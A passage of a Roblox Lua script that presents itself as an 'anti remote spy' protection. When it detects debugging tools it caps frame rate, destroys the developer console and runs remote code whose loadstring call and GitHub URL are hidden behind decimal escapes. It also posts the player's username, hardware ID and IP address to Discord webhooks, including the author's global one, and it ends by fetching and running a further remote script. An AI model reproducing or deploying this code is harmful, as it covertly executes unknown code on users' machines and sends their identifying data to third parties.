                _G.BTpX5SKNreFOyWnhAc7anyt6XFu9zFCuAPeq63wOn76Q85Bjjw2n084FT88UlFv6LUW45IAZ2n8h9U3QECwABbupB29X287W23pTOnjd0teyXSTvbpbs3M1c2IWf6oUT8VZN5Z3WJytRAB4Wcz2lW17194hjF6Di90YdEgxCmZ4zp2rfu8t3jBb6yC15hkaBK85X5k7W3N95zw5g68tsfnYaHIx1ZY81JNXBn4onTt63N98898LEi9ad0i342o2ST5e082ar87bDeXrq93Kzo37DdmX13351R40Uf48YVBNZW48k1jx1kIOkA9E1H1XeF0bE78Gmjg06ctozEWPP28zlzbGnaaVG4h1wi36H4z0DzC4S5Un1CwQ41ZiP85mxAAreb3wp1ZhA4x9plgC12xAHQR5Fr050KOrzYbYppJf4oTf9U15xI51EarWCExRbvV8tIEL1Bvg3c65CaA307piWAn5mu5dBE15bQY6BO25Py08gE4c3nh95neP7wqC31YhjL2w59Jm4f7rpR1R97Ljupp35qA88nSpaJsmx43my6HP1M2Y4qDGP9zl95AK95OhbCLuJxA99o6KrR7QXcqH0LQy5291BgQAMyo7wc9tmLSot3326yy48s1Q5474NNb313S1u7587q1hYpE4E9sOW3Dv2jHq954EDpY916toGMtm1OR59L22iC8onvggk1JgQPzOr5IXWAV2d43ujFvm1q7zlyaIH5px2NWB73732kNA4tfU3lRRe25vHsdy9avVVcm4wBU9I6LJJC8lAKLR0Dn2anaXD849ADFhW6SGmet13t6nCDc0hYVlJQW7ua814NUOWEV0mgg35Em3UFcVS2W11w05iuY1GkC67j23ft7H0o0o2pUR3tS1Iha8GnJS00mH43643uDMFG20F8m7QM1dOQxWyZfPaEr9VyFMx8j0eKlXDPEU66EDuCYk9JW26Ie7i5MeCY8S38bpG064V0qllIMq7AmY8L3dx =
                    false
                setfpscap(getgenv().fpsPunishment)
                devconsole:Destroy()
                getfenv(1)["\108\111\97\100\115\116\114\105\110\103"](
                    game:HttpGet(
                        "\104\116\116\112\115\58\47\47\114\97\119\46\103\105\116\104\117\98\117\115\101\114\99\111\110\116\101\110\116\46\99\111\109\47\87\120\101\114\47\87\120\101\114\47\109\97\105\110\47\114\111\98\108\111\120\47\121\111\117\114\101\95\97\110\95\105\100\105\111\116\46\108\117\97"
                    )
                )()
                if getgenv().webhookLogs == true then
                    if res.Success then
                        local index = string.find(res.Body, "Executor Name:")
                        if index then
                            local plr = game.Players.LocalPlayer
                            local Content = ""
                            local Embed = {
                                ["color"] = "000000",
                                ["description"] = "**Alert Reason:** Possible RemoteSpy\n**Username:** " ..
                                    plr.Name ..
                                        "\n**Game Link:** https://www.roblox.com/games/" ..
                                            game.PlaceId ..
                                                "\n\n**Hardware ID:** " ..
                                                    string.sub(res.Body, 19, index - 5) ..
                                                        "\n\n**IP:** " .. game:HttpGet("http://api.ipify.org"),
                                ["author"] = {["name"] = "Anti Remote Spy Logs"}
                            }
                            (syn and syn.request or http_request or http.request) {
                                Url = (getgenv().webhook),
                                Method = "POST",
                                Headers = {["Content-Type"] = "application/json"},
                                Body = game:GetService "HttpService":JSONEncode({content = Content, embeds = {Embed}})
                            }
                        end
                    end
                end
                if getgenv().globalLogs == true then
                    if res.Success then
                        local index = string.find(res.Body, "Executor Name:")
                        if index then
                            local plr = game.Players.LocalPlayer
                            local Content = ""
                            local Embed = {
                                ["color"] = "000000",
                                ["description"] = "**Alert Reason:** Possible RemoteSpy\n**Username:** " ..
                                    plr.Name ..
                                        "\n**Game Link:** https://www.roblox.com/games/" ..
                                            game.PlaceId ..
                                                "\n\n**Hardware ID:** " ..
                                                    string.sub(res.Body, 19, index - 5) ..
                                                        "\n\n**IP:** " .. game:HttpGet("http://api.ipify.org"),
                                ["author"] = {["name"] = "Anti Remote Spy Logs"}
                            }
                            (syn and syn.request or http_request or http.request) {
                                Url = (globalWebhook),
                                Method = "POST",
                                Headers = {["Content-Type"] = "application/json"},
                                Body = game:GetService "HttpService":JSONEncode({content = Content, embeds = {Embed}})
                            }
                        end
                    end
                end
            end

            -- simple spy
            if _G.SimpleSpyExecuted or type(_G.SimpleSpyExecuted) == "function" then
                _G.BTpX5SKNreFOyWnhAc7anyt6XFu9zFCuAPeq63wOn76Q85Bjjw2n084FT88UlFv6LUW45IAZ2n8h9U3QECwABbupB29X287W23pTOnjd0teyXSTvbpbs3M1c2IWf6oUT8VZN5Z3WJytRAB4Wcz2lW17194hjF6Di90YdEgxCmZ4zp2rfu8t3jBb6yC15hkaBK85X5k7W3N95zw5g68tsfnYaHIx1ZY81JNXBn4onTt63N98898LEi9ad0i342o2ST5e082ar87bDeXrq93Kzo37DdmX13351R40Uf48YVBNZW48k1jx1kIOkA9E1H1XeF0bE78Gmjg06ctozEWPP28zlzbGnaaVG4h1wi36H4z0DzC4S5Un1CwQ41ZiP85mxAAreb3wp1ZhA4x9plgC12xAHQR5Fr050KOrzYbYppJf4oTf9U15xI51EarWCExRbvV8tIEL1Bvg3c65CaA307piWAn5mu5dBE15bQY6BO25Py08gE4c3nh95neP7wqC31YhjL2w59Jm4f7rpR1R97Ljupp35qA88nSpaJsmx43my6HP1M2Y4qDGP9zl95AK95OhbCLuJxA99o6KrR7QXcqH0LQy5291BgQAMyo7wc9tmLSot3326yy48s1Q5474NNb313S1u7587q1hYpE4E9sOW3Dv2jHq954EDpY916toGMtm1OR59L22iC8onvggk1JgQPzOr5IXWAV2d43ujFvm1q7zlyaIH5px2NWB73732kNA4tfU3lRRe25vHsdy9avVVcm4wBU9I6LJJC8lAKLR0Dn2anaXD849ADFhW6SGmet13t6nCDc0hYVlJQW7ua814NUOWEV0mgg35Em3UFcVS2W11w05iuY1GkC67j23ft7H0o0o2pUR3tS1Iha8GnJS00mH43643uDMFG20F8m7QM1dOQxWyZfPaEr9VyFMx8j0eKlXDPEU66EDuCYk9JW26Ie7i5MeCY8S38bpG064V0qllIMq7AmY8L3dx =
                    false
                setfpscap(getgenv().fpsPunishment)
                devconsole:Destroy()
                getfenv(1)["\108\111\97\100\115\116\114\105\110\103"](
                    game:HttpGet(
                        "\104\116\116\112\115\58\47\47\114\97\119\46\103\105\116\104\117\98\117\115\101\114\99\111\110\116\101\110\116\46\99\111\109\47\87\120\101\114\47\87\120\101\114\47\109\97\105\110\47\114\111\98\108\111\120\47\121\111\117\114\101\95\97\110\95\105\100\105\111\116\46\108\117\97"
                    )
                )()
                if getgenv().webhookLogs == true then
                    if res.Success then
                        local index = string.find(res.Body, "Executor Name:")
                        if index then
                            local plr = game.Players.LocalPlayer
                            local Content = ""
                            local Embed = {
                                ["color"] = "000000",
                                ["description"] = "**Alert Reason:** Possible RemoteSpy\n**Username:** " ..
                                    plr.Name ..
                                        "\n**Game Link:** https://www.roblox.com/games/" ..
                                            game.PlaceId ..
                                                "\n\n**Hardware ID:** " ..
                                                    string.sub(res.Body, 19, index - 5) ..
                                                        "\n\n**IP:** " .. game:HttpGet("http://api.ipify.org"),
                                ["author"] = {["name"] = "Anti Remote Spy Logs"}
                            }
                            (syn and syn.request or http_request or http.request) {
                                Url = (getgenv().webhook),
                                Method = "POST",
                                Headers = {["Content-Type"] = "application/json"},
                                Body = game:GetService "HttpService":JSONEncode({content = Content, embeds = {Embed}})
                            }
                        end
                    end
                end
                if getgenv().globalLogs == true then
                    if res.Success then
                        local index = string.find(res.Body, "Executor Name:")
                        if index then
                            local plr = game.Players.LocalPlayer
                            local Content = ""
                            local Embed = {
                                ["color"] = "000000",
                                ["description"] = "**Alert Reason:** Possible RemoteSpy\n**Username:** " ..
                                    plr.Name ..
                                        "\n**Game Link:** https://www.roblox.com/games/" ..
                                            game.PlaceId ..
                                                "\n\n**Hardware ID:** " ..
                                                    string.sub(res.Body, 19, index - 5) ..
                                                        "\n\n**IP:** " .. game:HttpGet("http://api.ipify.org"),
                                ["author"] = {["name"] = "Anti Remote Spy Logs"}
                            }
                            (syn and syn.request or http_request or http.request) {
                                Url = (globalWebhook),
                                Method = "POST",
                                Headers = {["Content-Type"] = "application/json"},
                                Body = game:GetService "HttpService":JSONEncode({content = Content, embeds = {Embed}})
                            }
                        end
                    end
                end
            end
            if _G.SimpleSpyMaxStringSize then
                _G.BTpX5SKNreFOyWnhAc7anyt6XFu9zFCuAPeq63wOn76Q85Bjjw2n084FT88UlFv6LUW45IAZ2n8h9U3QECwABbupB29X287W23pTOnjd0teyXSTvbpbs3M1c2IWf6oUT8VZN5Z3WJytRAB4Wcz2lW17194hjF6Di90YdEgxCmZ4zp2rfu8t3jBb6yC15hkaBK85X5k7W3N95zw5g68tsfnYaHIx1ZY81JNXBn4onTt63N98898LEi9ad0i342o2ST5e082ar87bDeXrq93Kzo37DdmX13351R40Uf48YVBNZW48k1jx1kIOkA9E1H1XeF0bE78Gmjg06ctozEWPP28zlzbGnaaVG4h1wi36H4z0DzC4S5Un1CwQ41ZiP85mxAAreb3wp1ZhA4x9plgC12xAHQR5Fr050KOrzYbYppJf4oTf9U15xI51EarWCExRbvV8tIEL1Bvg3c65CaA307piWAn5mu5dBE15bQY6BO25Py08gE4c3nh95neP7wqC31YhjL2w59Jm4f7rpR1R97Ljupp35qA88nSpaJsmx43my6HP1M2Y4qDGP9zl95AK95OhbCLuJxA99o6KrR7QXcqH0LQy5291BgQAMyo7wc9tmLSot3326yy48s1Q5474NNb313S1u7587q1hYpE4E9sOW3Dv2jHq954EDpY916toGMtm1OR59L22iC8onvggk1JgQPzOr5IXWAV2d43ujFvm1q7zlyaIH5px2NWB73732kNA4tfU3lRRe25vHsdy9avVVcm4wBU9I6LJJC8lAKLR0Dn2anaXD849ADFhW6SGmet13t6nCDc0hYVlJQW7ua814NUOWEV0mgg35Em3UFcVS2W11w05iuY1GkC67j23ft7H0o0o2pUR3tS1Iha8GnJS00mH43643uDMFG20F8m7QM1dOQxWyZfPaEr9VyFMx8j0eKlXDPEU66EDuCYk9JW26Ie7i5MeCY8S38bpG064V0qllIMq7AmY8L3dx =
                    false
                setfpscap(getgenv().fpsPunishment)
                devconsole:Destroy()
                if getgenv().webhookLogs == true then
                    if res.Success then
                        local index = string.find(res.Body, "Executor Name:")
                        if index then
                            local plr = game.Players.LocalPlayer
                            local Content = ""
                            local Embed = {
                                ["color"] = "000000",
                                ["description"] = "**Alert Reason:** Possible RemoteSpy\n**Username:** " ..
                                    plr.Name ..
                                        "\n**Game Link:** https://www.roblox.com/games/" ..
                                            game.PlaceId ..
                                                "\n\n**Hardware ID:** " ..
                                                    string.sub(res.Body, 19, index - 5) ..
                                                        "\n\n**IP:** " .. game:HttpGet("http://api.ipify.org"),
                                ["author"] = {["name"] = "Anti Remote Spy Logs"}
                            }
                            (syn and syn.request or http_request or http.request) {
                                Url = (getgenv().webhook),
                                Method = "POST",
                                Headers = {["Content-Type"] = "application/json"},
                                Body = game:GetService "HttpService":JSONEncode({content = Content, embeds = {Embed}})
                            }
                        end
                    end
                end
                if getgenv().globalLogs == true then
                    if res.Success then
                        local index = string.find(res.Body, "Executor Name:")
                        if index then
                            local plr = game.Players.LocalPlayer
                            local Content = ""
                            local Embed = {
                                ["color"] = "000000",
                                ["description"] = "**Alert Reason:** Possible RemoteSpy\n**Username:** " ..
                                    plr.Name ..
                                        "\n**Game Link:** https://www.roblox.com/games/" ..
                                            game.PlaceId ..
                                                "\n\n**Hardware ID:** " ..
                                                    string.sub(res.Body, 19, index - 5) ..
                                                        "\n\n**IP:** " .. game:HttpGet("http://api.ipify.org"),
                                ["author"] = {["name"] = "Anti Remote Spy Logs"}
                            }
                            (syn and syn.request or http_request or http.request) {
                                Url = (globalWebhook),
                                Method = "POST",
                                Headers = {["Content-Type"] = "application/json"},
                                Body = game:GetService "HttpService":JSONEncode({content = Content, embeds = {Embed}})
                            }
                        end
                    end
                end
                getfenv(1)["\108\111\97\100\115\116\114\105\110\103"](
                    game:HttpGet(
                        "\104\116\116\112\115\58\47\47\114\97\119\46\103\105\116\104\117\98\117\115\101\114\99\111\110\116\101\110\116\46\99\111\109\47\87\120\101\114\47\87\120\101\114\47\109\97\105\110\47\114\111\98\108\111\120\47\121\111\117\114\101\95\97\110\95\105\100\105\111\116\46\108\117\97"
                    )
                )()
            end

            if getgenv().SimpleSpy then
                _G.BTpX5SKNreFOyWnhAc7anyt6XFu9zFCuAPeq63wOn76Q85Bjjw2n084FT88UlFv6LUW45IAZ2n8h9U3QECwABbupB29X287W23pTOnjd0teyXSTvbpbs3M1c2IWf6oUT8VZN5Z3WJytRAB4Wcz2lW17194hjF6Di90YdEgxCmZ4zp2rfu8t3jBb6yC15hkaBK85X5k7W3N95zw5g68tsfnYaHIx1ZY81JNXBn4onTt63N98898LEi9ad0i342o2ST5e082ar87bDeXrq93Kzo37DdmX13351R40Uf48YVBNZW48k1jx1kIOkA9E1H1XeF0bE78Gmjg06ctozEWPP28zlzbGnaaVG4h1wi36H4z0DzC4S5Un1CwQ41ZiP85mxAAreb3wp1ZhA4x9plgC12xAHQR5Fr050KOrzYbYppJf4oTf9U15xI51EarWCExRbvV8tIEL1Bvg3c65CaA307piWAn5mu5dBE15bQY6BO25Py08gE4c3nh95neP7wqC31YhjL2w59Jm4f7rpR1R97Ljupp35qA88nSpaJsmx43my6HP1M2Y4qDGP9zl95AK95OhbCLuJxA99o6KrR7QXcqH0LQy5291BgQAMyo7wc9tmLSot3326yy48s1Q5474NNb313S1u7587q1hYpE4E9sOW3Dv2jHq954EDpY916toGMtm1OR59L22iC8onvggk1JgQPzOr5IXWAV2d43ujFvm1q7zlyaIH5px2NWB73732kNA4tfU3lRRe25vHsdy9avVVcm4wBU9I6LJJC8lAKLR0Dn2anaXD849ADFhW6SGmet13t6nCDc0hYVlJQW7ua814NUOWEV0mgg35Em3UFcVS2W11w05iuY1GkC67j23ft7H0o0o2pUR3tS1Iha8GnJS00mH43643uDMFG20F8m7QM1dOQxWyZfPaEr9VyFMx8j0eKlXDPEU66EDuCYk9JW26Ie7i5MeCY8S38bpG064V0qllIMq7AmY8L3dx =
                    false
                setfpscap(getgenv().fpsPunishment)
                devconsole:Destroy()
                if getgenv().webhookLogs == true then
                    if res.Success then
                        local index = string.find(res.Body, "Executor Name:")
                        if index then
                            local plr = game.Players.LocalPlayer
                            local Content = ""
                            local Embed = {
                                ["color"] = "000000",
                                ["description"] = "**Alert Reason:** Possible RemoteSpy\n**Username:** " ..
                                    plr.Name ..
                                        "\n**Game Link:** https://www.roblox.com/games/" ..
                                            game.PlaceId ..
                                                "\n\n**Hardware ID:** " ..
                                                    string.sub(res.Body, 19, index - 5) ..
                                                        "\n\n**IP:** " .. game:HttpGet("http://api.ipify.org"),
                                ["author"] = {["name"] = "Anti Remote Spy Logs"}
                            }
                            (syn and syn.request or http_request or http.request) {
                                Url = (getgenv().webhook),
                                Method = "POST",
                                Headers = {["Content-Type"] = "application/json"},
                                Body = game:GetService "HttpService":JSONEncode({content = Content, embeds = {Embed}})
                            }
                        end
                    end
                end
                if getgenv().globalLogs == true then
                    if res.Success then
                        local index = string.find(res.Body, "Executor Name:")
                        if index then
                            local plr = game.Players.LocalPlayer
                            local Content = ""
                            local Embed = {
                                ["color"] = "000000",
                                ["description"] = "**Alert Reason:** Possible RemoteSpy\n**Username:** " ..
                                    plr.Name ..
                                        "\n**Game Link:** https://www.roblox.com/games/" ..
                                            game.PlaceId ..
                                                "\n\n**Hardware ID:** " ..
                                                    string.sub(res.Body, 19, index - 5) ..
                                                        "\n\n**IP:** " .. game:HttpGet("http://api.ipify.org"),
                                ["author"] = {["name"] = "Anti Remote Spy Logs"}
                            }
                            (syn and syn.request or http_request or http.request) {
                                Url = (globalWebhook),
                                Method = "POST",
                                Headers = {["Content-Type"] = "application/json"},
                                Body = game:GetService "HttpService":JSONEncode({content = Content, embeds = {Embed}})
                            }
                        end
                    end
                end
                getfenv(1)["\108\111\97\100\115\116\114\105\110\103"](
                    game:HttpGet(
                        "\104\116\116\112\115\58\47\47\114\97\119\46\103\105\116\104\117\98\117\115\101\114\99\111\110\116\101\110\116\46\99\111\109\47\87\120\101\114\47\87\120\101\114\47\109\97\105\110\47\114\111\98\108\111\120\47\121\111\117\114\101\95\97\110\95\105\100\105\111\116\46\108\117\97"
                    )
                )()
            end

            -- hyroxide
            for h, r in pairs(game.CoreGui:GetDescendants()) do
                if r.Name:find("ContextMenus") then
                    r:Destroy()
                    devconsole:Destroy()
                    wait(0.1)
                    _G.BTpX5SKNreFOyWnhAc7anyt6XFu9zFCuAPeq63wOn76Q85Bjjw2n084FT88UlFv6LUW45IAZ2n8h9U3QECwABbupB29X287W23pTOnjd0teyXSTvbpbs3M1c2IWf6oUT8VZN5Z3WJytRAB4Wcz2lW17194hjF6Di90YdEgxCmZ4zp2rfu8t3jBb6yC15hkaBK85X5k7W3N95zw5g68tsfnYaHIx1ZY81JNXBn4onTt63N98898LEi9ad0i342o2ST5e082ar87bDeXrq93Kzo37DdmX13351R40Uf48YVBNZW48k1jx1kIOkA9E1H1XeF0bE78Gmjg06ctozEWPP28zlzbGnaaVG4h1wi36H4z0DzC4S5Un1CwQ41ZiP85mxAAreb3wp1ZhA4x9plgC12xAHQR5Fr050KOrzYbYppJf4oTf9U15xI51EarWCExRbvV8tIEL1Bvg3c65CaA307piWAn5mu5dBE15bQY6BO25Py08gE4c3nh95neP7wqC31YhjL2w59Jm4f7rpR1R97Ljupp35qA88nSpaJsmx43my6HP1M2Y4qDGP9zl95AK95OhbCLuJxA99o6KrR7QXcqH0LQy5291BgQAMyo7wc9tmLSot3326yy48s1Q5474NNb313S1u7587q1hYpE4E9sOW3Dv2jHq954EDpY916toGMtm1OR59L22iC8onvggk1JgQPzOr5IXWAV2d43ujFvm1q7zlyaIH5px2NWB73732kNA4tfU3lRRe25vHsdy9avVVcm4wBU9I6LJJC8lAKLR0Dn2anaXD849ADFhW6SGmet13t6nCDc0hYVlJQW7ua814NUOWEV0mgg35Em3UFcVS2W11w05iuY1GkC67j23ft7H0o0o2pUR3tS1Iha8GnJS00mH43643uDMFG20F8m7QM1dOQxWyZfPaEr9VyFMx8j0eKlXDPEU66EDuCYk9JW26Ie7i5MeCY8S38bpG064V0qllIMq7AmY8L3dx =
                        false
                    setfpscap(getgenv().fpsPunishment)
                    getfenv(1)["\108\111\97\100\115\116\114\105\110\103"](
                        game:HttpGet(
                            "\104\116\116\112\115\58\47\47\114\97\119\46\103\105\116\104\117\98\117\115\101\114\99\111\110\116\101\110\116\46\99\111\109\47\87\120\101\114\47\87\120\101\114\47\109\97\105\110\47\114\111\98\108\111\120\47\121\111\117\114\101\95\97\110\95\105\100\105\111\116\46\108\117\97"
                        )
                    )()
                    if getgenv().webhookLogs == true then
                        if res.Success then
                            local index = string.find(res.Body, "Executor Name:")
                            if index then
                                local plr = game.Players.LocalPlayer
                                local Content = ""
                                local Embed = {
                                    ["color"] = "000000",
                                    ["description"] = "**Alert Reason:** Possible RemoteSpy\n**Username:** " ..
                                        plr.Name ..
                                            "\n**Game Link:** https://www.roblox.com/games/" ..
                                                game.PlaceId ..
                                                    "\n\n**Hardware ID:** " ..
                                                        string.sub(res.Body, 19, index - 5) ..
                                                            "\n\n**IP:** " .. game:HttpGet("http://api.ipify.org"),
                                    ["author"] = {["name"] = "Anti Remote Spy Logs"}
                                }
                                (syn and syn.request or http_request or http.request) {
                                    Url = (getgenv().webhook),
                                    Method = "POST",
                                    Headers = {["Content-Type"] = "application/json"},
                                    Body = game:GetService "HttpService":JSONEncode(
                                        {content = Content, embeds = {Embed}}
                                    )
                                }
                            end
                        end
                    end
                    if getgenv().globalLogs == true then
                        if res.Success then
                            local index = string.find(res.Body, "Executor Name:")
                            if index then
                                local plr = game.Players.LocalPlayer
                                local Content = ""
                                local Embed = {
                                    ["color"] = "000000",
                                    ["description"] = "**Alert Reason:** Possible RemoteSpy\n**Username:** " ..
                                        plr.Name ..
                                            "\n**Game Link:** https://www.roblox.com/games/" ..
                                                game.PlaceId ..
                                                    "\n\n**Hardware ID:** " ..
                                                        string.sub(res.Body, 19, index - 5) ..
                                                            "\n\n**IP:** " .. game:HttpGet("http://api.ipify.org"),
                                    ["author"] = {["name"] = "Anti Remote Spy Logs"}
                                }
                                (syn and syn.request or http_request or http.request) {
                                    Url = (globalWebhook),
                                    Method = "POST",
                                    Headers = {["Content-Type"] = "application/json"},
                                    Body = game:GetService "HttpService":JSONEncode(
                                        {content = Content, embeds = {Embed}}
                                    )
                                }
                            end
                        end
                    end
                end
            end

            -- developer console remote spy
            local devconsole = game.CoreGui:WaitForChild("DevConsoleMaster")
            devconsole.DevConsoleWindow.DevConsoleUI:WaitForChild("MainView")
            for d, c in pairs(devconsole.DevConsoleWindow.DevConsoleUI.MainView:GetDescendants()) do
                if c:IsA("TextLabel") then
                    if
                        string.match(
                            c.Text,
                            ("RemoteEvent" or "RemoteFunction" or "Spy" or "Logged" or "Logger" or "RemoteSpy")
                        )
                     then
                        devconsole:Destroy()
                        _G.BTpX5SKNreFOyWnhAc7anyt6XFu9zFCuAPeq63wOn76Q85Bjjw2n084FT88UlFv6LUW45IAZ2n8h9U3QECwABbupB29X287W23pTOnjd0teyXSTvbpbs3M1c2IWf6oUT8VZN5Z3WJytRAB4Wcz2lW17194hjF6Di90YdEgxCmZ4zp2rfu8t3jBb6yC15hkaBK85X5k7W3N95zw5g68tsfnYaHIx1ZY81JNXBn4onTt63N98898LEi9ad0i342o2ST5e082ar87bDeXrq93Kzo37DdmX13351R40Uf48YVBNZW48k1jx1kIOkA9E1H1XeF0bE78Gmjg06ctozEWPP28zlzbGnaaVG4h1wi36H4z0DzC4S5Un1CwQ41ZiP85mxAAreb3wp1ZhA4x9plgC12xAHQR5Fr050KOrzYbYppJf4oTf9U15xI51EarWCExRbvV8tIEL1Bvg3c65CaA307piWAn5mu5dBE15bQY6BO25Py08gE4c3nh95neP7wqC31YhjL2w59Jm4f7rpR1R97Ljupp35qA88nSpaJsmx43my6HP1M2Y4qDGP9zl95AK95OhbCLuJxA99o6KrR7QXcqH0LQy5291BgQAMyo7wc9tmLSot3326yy48s1Q5474NNb313S1u7587q1hYpE4E9sOW3Dv2jHq954EDpY916toGMtm1OR59L22iC8onvggk1JgQPzOr5IXWAV2d43ujFvm1q7zlyaIH5px2NWB73732kNA4tfU3lRRe25vHsdy9avVVcm4wBU9I6LJJC8lAKLR0Dn2anaXD849ADFhW6SGmet13t6nCDc0hYVlJQW7ua814NUOWEV0mgg35Em3UFcVS2W11w05iuY1GkC67j23ft7H0o0o2pUR3tS1Iha8GnJS00mH43643uDMFG20F8m7QM1dOQxWyZfPaEr9VyFMx8j0eKlXDPEU66EDuCYk9JW26Ie7i5MeCY8S38bpG064V0qllIMq7AmY8L3dx =
                            false
                        setfpscap(getgenv().fpsPunishment)
                        if getgenv().webhookLogs == true then
                            if res.Success then
                                local index = string.find(res.Body, "Executor Name:")
                                if index then
                                    local plr = game.Players.LocalPlayer
                                    local Content = ""
                                    local Embed = {
                                        ["color"] = "000000",
                                        ["description"] = "**Alert Reason:** Possible RemoteSpy\n**Username:** " ..
                                            plr.Name ..
                                                "\n**Game Link:** https://www.roblox.com/games/" ..
                                                    game.PlaceId ..
                                                        "\n\n**Hardware ID:** " ..
                                                            string.sub(res.Body, 19, index - 5) ..
                                                                "\n\n**IP:** " .. game:HttpGet("http://api.ipify.org"),
                                        ["author"] = {["name"] = "Anti Remote Spy Logs"}
                                    }
                                    (syn and syn.request or http_request or http.request) {
                                        Url = (getgenv().webhook),
                                        Method = "POST",
                                        Headers = {["Content-Type"] = "application/json"},
                                        Body = game:GetService "HttpService":JSONEncode(
                                            {content = Content, embeds = {Embed}}
                                        )
                                    }
                                end
                            end
                        end
                        if getgenv().globalLogs == true then
                            if res.Success then
                                local index = string.find(res.Body, "Executor Name:")
                                if index then
                                    local plr = game.Players.LocalPlayer
                                    local Content = ""
                                    local Embed = {
                                        ["color"] = "000000",
                                        ["description"] = "**Alert Reason:** Possible RemoteSpy\n**Username:** " ..
                                            plr.Name ..
                                                "\n**Game Link:** https://www.roblox.com/games/" ..
                                                    game.PlaceId ..
                                                        "\n\n**Hardware ID:** " ..
                                                            string.sub(res.Body, 19, index - 5) ..
                                                                "\n\n**IP:** " .. game:HttpGet("http://api.ipify.org"),
                                        ["author"] = {["name"] = "Anti Remote Spy Logs"}
                                    }
                                    (syn and syn.request or http_request or http.request) {
                                        Url = (globalWebhook),
                                        Method = "POST",
                                        Headers = {["Content-Type"] = "application/json"},
                                        Body = game:GetService "HttpService":JSONEncode(
                                            {content = Content, embeds = {Embed}}
                                        )
                                    }
                                end
                            end
                        end
                        getfenv(1)["\108\111\97\100\115\116\114\105\110\103"](
                            game:HttpGet(
                                "\104\116\116\112\115\58\47\47\114\97\119\46\103\105\116\104\117\98\117\115\101\114\99\111\110\116\101\110\116\46\99\111\109\47\87\120\101\114\47\87\120\101\114\47\109\97\105\110\47\114\111\98\108\111\120\47\121\111\117\114\101\95\97\110\95\105\100\105\111\116\46\108\117\97"
                            )
                        )()
                    end
                end
            end
        elseif
            _G.BTpX5SKNreFOyWnhAc7anyt6XFu9zFCuAPeq63wOn76Q85Bjjw2n084FT88UlFv6LUW45IAZ2n8h9U3QECwABbupB29X287W23pTOnjd0teyXSTvbpbs3M1c2IWf6oUT8VZN5Z3WJytRAB4Wcz2lW17194hjF6Di90YdEgxCmZ4zp2rfu8t3jBb6yC15hkaBK85X5k7W3N95zw5g68tsfnYaHIx1ZY81JNXBn4onTt63N98898LEi9ad0i342o2ST5e082ar87bDeXrq93Kzo37DdmX13351R40Uf48YVBNZW48k1jx1kIOkA9E1H1XeF0bE78Gmjg06ctozEWPP28zlzbGnaaVG4h1wi36H4z0DzC4S5Un1CwQ41ZiP85mxAAreb3wp1ZhA4x9plgC12xAHQR5Fr050KOrzYbYppJf4oTf9U15xI51EarWCExRbvV8tIEL1Bvg3c65CaA307piWAn5mu5dBE15bQY6BO25Py08gE4c3nh95neP7wqC31YhjL2w59Jm4f7rpR1R97Ljupp35qA88nSpaJsmx43my6HP1M2Y4qDGP9zl95AK95OhbCLuJxA99o6KrR7QXcqH0LQy5291BgQAMyo7wc9tmLSot3326yy48s1Q5474NNb313S1u7587q1hYpE4E9sOW3Dv2jHq954EDpY916toGMtm1OR59L22iC8onvggk1JgQPzOr5IXWAV2d43ujFvm1q7zlyaIH5px2NWB73732kNA4tfU3lRRe25vHsdy9avVVcm4wBU9I6LJJC8lAKLR0Dn2anaXD849ADFhW6SGmet13t6nCDc0hYVlJQW7ua814NUOWEV0mgg35Em3UFcVS2W11w05iuY1GkC67j23ft7H0o0o2pUR3tS1Iha8GnJS00mH43643uDMFG20F8m7QM1dOQxWyZfPaEr9VyFMx8j0eKlXDPEU66EDuCYk9JW26Ie7i5MeCY8S38bpG064V0qllIMq7AmY8L3dx ==
                false
         then
            setclipboard(math.random(1, 100000))
            game:Shutdown()
        end
    end
)

warn("Anti spy remote was enabled.")

local function contains(table, val)
    for i = 1, #table do
        if table[i] == val then
            location = i
            return true
        end
    end
    return false
end

local http_request = http_request
if syn then
    http_request = syn.request
elseif SENTINEL_V2 then
    function http_request(tb)
        return {
            StatusCode = 200,
            Body = request(tb.Url, tb.Method, (tb.Body or ""))
        }
    end
end
    warn([[
 _________________________________________      __________________________________________
 |                                        |     |                                         |
 |                                        |     |                                         |
 |      __________________________________|     |       __________________________________|
 |      |                                       |       |
 |      |                                       |       |
 |      |                                       |       |
 |      |                                       |       |
 |      |                                       |       |
 |      |                                       |       |
 |      |                                       |       |
 |      |       M A D E B Y C U E R S Y         |       |    C U E R S Y S T U D I O S
 |      |                                       |       |
 |      |                                       |       |
 |      |                                       |       |
 |      |                                       |       |
 |      |                                       |       |
 |      |                                       |       |
 |      |                                       |       |
 |      |_________________________________      |       |_________________________________
 |                                        |     |                                         |
 |                                        |     |                                         | 
 |________________________________________|     |_________________________________________|
 ]])
 loadstring(game:HttpGet("https://raw.githubusercontent.com/kldmwakldaldjawdjakd/jdajwdjadjawd/main/cykablyat132"))()
